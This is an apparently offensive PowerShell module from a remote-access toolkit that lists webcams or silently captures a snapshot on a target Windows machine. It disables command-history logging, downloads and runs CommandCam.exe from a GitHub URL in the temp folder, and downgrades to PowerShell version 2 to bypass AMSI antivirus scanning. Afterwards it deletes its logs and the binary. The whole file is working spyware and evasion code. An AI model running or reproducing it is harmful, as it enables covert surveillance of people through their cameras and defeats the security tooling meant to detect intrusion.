<#
.SYNOPSIS
   List computer webcams or capture camera snapshot

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.1

.NOTES
  Remark: WebCam turns the ligth 'ON' taking snapshots.
  Using -Camera Snap @argument migth trigger AV detection
  Unless target system has powershell version 2 available.
  In that case them PS version 2 will be used to execute
  our binary file and bypass AV amsi detection.

.Parameter Camera
   Accepts arguments: Enum and Snap

.EXAMPLE
   PS C:\> Get-Help .\Camera.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\Camera.ps1 -Camera Enum
   List ALL WebCams Device Names available

.EXAMPLE
   PS C:\> .\Camera.ps1 -Camera Snap
   Take one screenshot using default camera

.OUTPUTS
   StartTime ProcessName DeviceName           
   --------- ----------- ----------           
   17:32:23  CommandCam  USB2.0 VGA UVC WebCam
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Camera="false"
)


Write-Host ""
If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

    ## Download CommandCam binary if not exist
    If(-not(Test-Path -Path "$Env:TMP\CommandCam.exe")){## Download CommandCam.exe from my GitHub repository
        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/CommandCam.exe -Destination $Env:TMP\CommandCam.exe -ErrorAction SilentlyContinue|Out-Null
        ## Check downloaded file integrity => FileSizeKBytes
        $SizeDump = ((Get-Item -Path "$Env:TMP\CommandCam.exe" -EA SilentlyContinue).length/1KB)
        If($SizeDump -lt 132){## Corrupted download detected => DefaultFileSize: 132/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\CommandCam.exe"){Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @Camera module
        }   
    }


    If($Camera -ieq "Enum"){## Enumerate All WebCam devices

        ## AMSI Bypass execution function
        $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
        If($CheckBypass -Match '2.0'){## PS version 2 found
            $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
            Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
            powershell -version 2 .\CommandCam.exe /devlist > $Env:TMP\CC.log
        }Else{## Remote Host without PS v2 available
           cd $Env:TMP
           $SnapTimer = Get-Date -Format 'HH:mm:ss'
           .\CommandCam.exe /devlist > $Env:TMP\CC.log
        }

        ## Parsing Camera Data
        If(Test-Path -Path "$Env:TMP\CC.log"){## Check for logfile existence
            $ParseData = Get-Content -Path "$Env:TMP\CC.log"|findstr /C:"Device name:"
            $StripPoints = $ParseData -split(":") ## Split report into two arrays
            ## Replace empty spaces in 'Beggining' and 'End' of string
            $DeviceCapture = $StripPoints[1] -replace '(^\s+|\s+$)',''
            Remove-Item -Path "$Env:TMP\CC.log" -Force
        }Else{## Error CC.log NOT found
            $DeviceCapture = "Fail to retrieve Device Name!"
        }


        ## Create Data Table for output
        $mytable = New-Object System.Data.DataTable
        $mytable.Columns.Add("StartTime")|Out-Null
        $mytable.Columns.Add("ProcessName")|Out-Null
        $mytable.Columns.Add("DeviceName")|Out-Null
        $mytable.Rows.Add("$SnapTimer",
                          "CommandCam",
                          "$DeviceCapture")|Out-Null

        ## Display Data Table
        $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
        Get-Content -Path "$Env:TMP\KeyDump.log"
        Remove-Item -Path "$Env:TMP\KeyDump.log" -Force

   }ElseIf($Camera -ieq "Snap"){## Take SnapShot with default Camera

        ## AMSI Bypass execution function
        $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
        If($CheckBypass -Match '2.0'){## PS version 2 found
            $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
            Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
            powershell -version 2 .\CommandCam.exe /quiet
        }Else{## Remote Host without PS v2 available
           cd $Env:TMP
           .\CommandCam.exe /quiet
           $SnapTimer = Get-Date -Format 'HH:mm:ss'
        }

        ## Make sure image.bmp exist
        If(Test-Path -Path "$Env:TMP\image.bmp"){
           $Cap = "$Env:TMP\image.bmp"
        }Else{## Image.bmp NOT found
           $Cap = "Fail to take webcam snaphot!"
        }

        ## Create Data Table for output
        $mytable = New-Object System.Data.DataTable
        $mytable.Columns.Add("StartTime")|Out-Null
        $mytable.Columns.Add("ProcessName")|Out-Null
        $mytable.Columns.Add("Capture")|Out-Null
        $mytable.Rows.Add("$SnapTimer",
                          "CommandCam",
                          "$Cap")|Out-Null

        ## Display Data Table
        $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
        Get-Content -Path "$Env:TMP\KeyDump.log"
        Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
   }

   ## Clean OLd files
   If(Test-Path -Path "$Env:TMP\CommandCam.exe"){
      Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force
   }
   If(Test-Path -Path "$Env:TMP\test.log"){
      Remove-Item -Path "$Env:TMP\test.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1
}
